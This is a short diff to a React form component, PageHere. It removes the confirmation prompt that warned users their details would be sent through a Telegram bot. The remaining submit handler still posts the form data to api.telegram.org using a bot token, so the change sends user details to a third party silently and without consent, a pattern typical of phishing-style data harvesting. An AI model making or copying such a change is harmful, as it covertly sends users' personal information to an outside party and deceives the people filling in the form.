@@ -58,12 +58,6 @@ const PageHere: React.FC = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (
-      !window.confirm(
-        "By submitting, you agree to share your details via a secure Telegram bot. Continue?"
-      )
-    )
-      return;
 
     try {
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
